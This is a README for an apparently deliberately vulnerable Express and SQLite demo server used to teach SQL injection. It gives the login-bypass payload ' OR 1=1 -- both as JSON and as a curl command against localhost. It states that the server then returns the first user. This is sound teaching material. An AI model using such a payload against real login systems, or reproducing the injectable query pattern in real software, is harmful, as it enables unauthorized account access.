# SQL Injection Example

A simple express server with in-memory SQLite database to demonstrate SQL injection.

## Usage

1. Start the server:

```bash
npm start
```

2. Try POST to `/login` with the following payload:

```json
{
  "username": "admin",
  "password": "' OR 1=1 --"
}
```

3. (Optional) To use curl:

```bash
curl -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "'\'' OR 1=1 --"}'
```

4. The server will return the first user in the database.
